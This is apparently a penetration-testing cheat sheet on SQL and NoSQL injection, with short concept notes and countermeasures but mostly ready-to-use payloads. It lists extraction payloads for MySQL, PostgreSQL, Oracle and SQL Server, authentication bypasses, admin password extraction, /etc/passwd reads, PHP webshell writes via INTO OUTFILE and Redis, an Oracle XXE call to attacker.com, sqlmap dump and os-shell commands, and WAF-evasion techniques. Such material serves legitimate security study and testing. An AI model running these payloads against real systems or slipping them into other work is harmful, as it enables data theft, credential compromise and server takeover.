# Terminology
The intention of SQL injection is to reveal or manipulate sensitive information from the database by injecting commands into existing queries.
  - Bypassing authentication
  - Revealing sensitive information
  - Compromise data integrity
  - Erase database

# Tools
  - sqlmap

# SQL
**SQL** stands for **S**tructured **Q**uery **L**anguage.

# Types of SQL Injection
  # **In-Band SQL Injection**
    Use the same communication channel to launch the attack and get the result.
  # **Error Based SQL Injection**
    - Server throw an error message
    - Error message is useful during the development, but should be disabled it when the application is live

# Techniques to perform SQL Injection
  - End of line comment - Comment out the Rest Query by using Comment Techniques.
  - Illegal / Logically incorrect query - Send an incorrect
  - Tautology (something that is inherently true, like " OR 1=1")

# Union SQL Injection
  Involves the **UNION** SQL operator, to combine the queries.
    **Select the `password` from `table1` and `table2` using UNION:**

                  SELECT password FROM table1
                              UNION
                  SELECT password FROM table2

# Inferential SQL Injection
  - Known as **Blind SQL Injection**
  - No data is transferred from the via the application, the attacker sending payloads, then observe the web application's response and behavior.

# Boolean-based Blind SQL Injection
  Sending an SQL query to the database which send a different result depending on whether the query returns TRUE
  or FALSE result, the HTTP response will change or remain the same.

  This type of attack is slow, attacker need to enumerate the database, character by character.

# Time-based Blind SQL Injection
  Attacker send a query, force the database to wait for a specified time before respond.
  The respond time indicate that the query TRUE or FALSE.

# Out-of-band SQL Injection
  Depends on the features allowed on the database server (DNS, HTTP request), so not a very common attack.

  Use different channel to launch the attack.

# SQL Injection Methodology
# Information Gathering And Vulnerability Detection

- Collect the information about the web application, server, OS, database, ...
- Identify vulnerabilities
- Evaluate input fields

### Launch Attack

- Select the appropriate type of SQL Injection, based on the gathered information

## Advanced SQL Injection

- Enumerate the database (Postgre, MySQL, Oracle, ...)
- Identify privilege level of users
- Passwords and hashes grabbing
- Transfer database to a remote machine

## Evasion Techniques

### Evading IDS

- Inserting inline comment in between keywords
- Character encoding
- String Concatenation
- Obfuscated codes
- Manipulating white spaces
- Hex encoding
- Sophisticated matches

## Countermeasures

- Penetration testing (manual, with tool)
- Source code analysis
- Wep Application Firewall (WAF)
- Remove debugging messages
- Database account with minimal privileges
- Input validation
- Filter data
- Customize error messages
- IDS

# Advanced SQL Injection Payloads and Techniques

## Error-Based SQL Injection Payloads

### MySQL Error-Based Injection
```sql
-- Basic Error-Based Payloads
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -
' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)-- -

-- Advanced Error-Based Techniques
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -

-- Data Extraction via Error Messages
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -
```

**Documentation**: Exploits database error messages to extract information when direct output is not available.
**Limitations**: Requires verbose error messages; may not work with error suppression; detected by WAFs.

### PostgreSQL Error-Based Injection
```sql
-- PostgreSQL Error-Based Payloads
' AND CAST((SELECT version()) AS int)-- -
' AND CAST((SELECT current_database()) AS int)-- -
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -

-- Advanced PostgreSQL Techniques
'; SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) END-- -
' UNION SELECT NULL,CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int)-- -
```

**Documentation**: PostgreSQL-specific error-based injection techniques using type casting errors.
**Limitations**: Requires PostgreSQL database; strict type checking needed; may be limited by privileges.

### Oracle Error-Based Injection
```sql
-- Oracle Error-Based Payloads
' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NULL-- -
' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual) IS NULL-- -

-- Oracle Specific Functions
' AND CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) IS NULL-- -
' UNION SELECT NULL,EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual-- -
```

**Documentation**: Oracle database error-based injection using XML functions and type conversion errors.
**Limitations**: Requires Oracle database; specific privilege requirements; complex syntax.

## Boolean-Based Blind SQL Injection

### Basic Boolean-Based Payloads
```sql
-- Authentication Bypass
admin'-- -
admin'/*
' OR '1'='1
' OR 1=1-- -
admin' OR '1'='1'-- -

-- Conditional Boolean Tests
' AND (SELECT SUBSTRING(VERSION(),1,1))='5'-- -
' AND (SELECT LENGTH(database()))=8-- -
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=115-- -

-- Database Enumeration
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=10-- -
' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=5-- -
```

**Documentation**: Boolean-based injection tests application responses to true/false conditions for data extraction.
**Limitations**: Time-intensive for large data sets; requires consistent application responses.

### Advanced Boolean-Based Techniques
```sql
-- Substring-Based Data Extraction
' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))='u'-- -
' AND (SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))='i'-- -

-- Binary Search Optimization
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))>64-- -
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))<91-- -
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))=65-- -
```

**Documentation**: Optimized boolean-based extraction using binary search for faster data retrieval.
**Limitations**: Still time-intensive; requires precise payload crafting; may trigger rate limiting.

## Time-Based Blind SQL Injection

### MySQL Time-Based Payloads
```sql
-- Basic Time-Based Tests
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -
1'; SELECT SLEEP(5)-- -

-- Conditional Time-Based Extraction
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=10,SLEEP(5),1)-- -
' AND IF((SELECT SUBSTRING(VERSION(),1,1))='5',SLEEP(5),1)-- -
' AND IF((SELECT LENGTH(database()))=8,SLEEP(5),1)-- -

-- Data Extraction via Time Delays
' AND IF((SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)))=117,SLEEP(5),1)-- -
```

**Documentation**: Uses database time delay functions to infer information when no output is available.
**Limitations**: Slow extraction process; network latency affects accuracy; may timeout on slow connections.

### PostgreSQL Time-Based Payloads
```sql
-- PostgreSQL Time-Based Tests
'; SELECT pg_sleep(5)-- -
' AND (SELECT pg_sleep(5) FROM pg_user WHERE current_user='postgres')-- -

-- Conditional Time Delays
'; SELECT CASE WHEN (SELECT current_database())='testdb' THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (SELECT LENGTH(current_database()))=6 THEN pg_sleep(5) END-- -
```

**Documentation**: PostgreSQL-specific time-based blind injection using pg_sleep function.
**Limitations**: Requires PostgreSQL; may be detected by monitoring systems; slow data extraction.

### SQL Server Time-Based Payloads
```sql
-- SQL Server Time-Based Tests
'; WAITFOR DELAY '00:00:05'-- -
' AND (SELECT COUNT(*) FROM sys.databases)>0; WAITFOR DELAY '00:00:05'-- -

-- Conditional Time Delays
'; IF (SELECT SYSTEM_USER)='sa' WAITFOR DELAY '00:00:05'-- -
'; IF (SELECT LEN(DB_NAME()))=6 WAITFOR DELAY '00:00:05'-- -
```

**Documentation**: Microsoft SQL Server time-based injection using WAITFOR DELAY command.
**Limitations**: Requires SQL Server; easily detected by monitoring; may cause application timeouts.

## Union-Based SQL Injection

### Advanced Union-Based Payloads
```sql
-- Determining Column Count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Data Type Discovery
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
' UNION SELECT 1,NULL,NULL-- -

-- Database Information Extraction
' UNION SELECT VERSION(),DATABASE(),USER()-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,username,password FROM users-- -
```

**Documentation**: Combines malicious query results with legitimate query output for direct data extraction.
**Limitations**: Requires compatible column count and data types; easily detected by WAFs.

### Advanced Union Techniques
```sql
-- Concatenation for Data Extraction
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- File System Access (MySQL)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -

-- Registry Access (SQL Server)
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName'-- -
```

**Documentation**: Advanced union-based techniques for file system access and system interaction.
**Limitations**: Requires specific privileges; file path permissions; may be disabled by security settings.

## SQLMap Automated Exploitation

### Basic SQLMap Usage
```bash
# Basic SQL injection testing
sqlmap -u "http://target.com/page.php?id=1"                    # Basic test
sqlmap -u "http://target.com/page.php?id=1" --dbs              # Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" -D database --tables # Enumerate tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns # Enumerate columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump # Dump data

# POST request testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" -p username

# Cookie-based injection
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abcd1234; user_id=1" -p user_id

# Advanced SQLMap features
sqlmap -u "http://target.com/page.php?id=1" --os-shell          # OS command shell
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" # File reading
sqlmap -u "http://target.com/page.php?id=1" --batch             # Non-interactive mode
```

**Documentation**: Automated SQL injection detection and exploitation using SQLMap tool.
**Limitations**: May be detected by WAFs; generates significant traffic; requires careful parameter tuning.

### SQLMap Evasion Techniques
```bash
# WAF Evasion
sqlmap -u "target" --tamper=space2comment,charencode,randomcase    # Multiple tamper scripts
sqlmap -u "target" --delay=2 --timeout=30                          # Timing adjustments
sqlmap -u "target" --random-agent --proxy=http://proxy:8080        # Randomization and proxy

# Custom Payloads
sqlmap -u "target" --suffix="-- -" --prefix="'"                    # Custom prefix/suffix
sqlmap -u "target" --technique=BEU                                 # Specific techniques only
```

**Documentation**: Advanced SQLMap usage for evading web application firewalls and detection systems.
**Limitations**: Modern WAFs may still detect; requires extensive testing; may cause application instability.

## NoSQL Injection Payloads

### MongoDB Injection
```javascript
// Authentication Bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$where": "return true"}, "password": {"$where": "return true"}}

// Information Extraction
{"username": {"$regex": "^a.*"}, "password": {"$ne": null}}       // Username enumeration
{"$where": "this.username.length == 5"}                          // Length-based enumeration

// Operator Injection
username[$ne]=invalid&password[$ne]=invalid                       // URL parameter injection
```

**Documentation**: NoSQL injection techniques targeting MongoDB and similar document databases.
**Limitations**: Specific to NoSQL databases; requires understanding of query structure; less common than SQL injection.

### Redis Injection
```bash
# Redis Command Injection
FLUSHALL                                                          # Clear all data
CONFIG SET dir /var/www/html/                                     # Set directory
CONFIG SET dbfilename shell.php                                   # Set filename
SET test "<?php system($_GET['cmd']); ?>"                        # Write webshell
SAVE                                                              # Save to file
```

**Documentation**: Redis-specific injection techniques for unauthorized access and command execution.
**Limitations**: Requires Redis access; specific configuration needed; modern Redis has better security.

## SQL Injection Prevention and Detection

### Input Validation Examples
```php
// PHP Prepared Statements (Secure)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);

// PHP Input Validation
$user_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($user_id === false) {
    die("Invalid input");
}

// Parameterized Queries (C#)
string sql = "SELECT * FROM users WHERE id = @id";
SqlCommand cmd = new SqlCommand(sql, connection);
cmd.Parameters.AddWithValue("@id", userId);
```

**Documentation**: Secure coding practices to prevent SQL injection vulnerabilities.
**Limitations**: Requires developer training; legacy code may be difficult to retrofit; performance considerations.

### WAF Bypass Techniques
```sql
-- Case Variation
' UnIoN SeLeCt NULL,NULL,NULL-- -

-- Comment Insertion
' UN/**/ION SE/**/LECT NULL,NULL,NULL-- -

-- Encoding
%27%20UNION%20SELECT%20NULL,NULL,NULL--%20-                      # URL encoding
' UNION SELECT CHAR(65),NULL,NULL-- -                            # Character encoding

-- Alternative Syntax
' UNION SELECT 0x41,NULL,NULL-- -                                # Hexadecimal
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- -           # MySQL version comments
```

**Documentation**: Techniques for bypassing web application firewalls and input filters.
**Limitations**: Modern WAFs use machine learning; may trigger additional security measures; temporary effectiveness.

# Reference URLs and Research Papers:
- OWASP SQL Injection Guide: https://owasp.org/www-community/attacks/SQL_Injection
- NIST SP 800-53 Database Security: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final
- SQLMap Documentation: https://sqlmap.org/
- SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- Research Paper: "Advanced SQL Injection" - https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf
- NoSQL Injection Guide: https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf
- Database Security Research: https://www.sans.org/reading-room/whitepapers/databases/
- PortSwigger SQL Injection Labs: https://portswigger.net/web-security/sql-injection
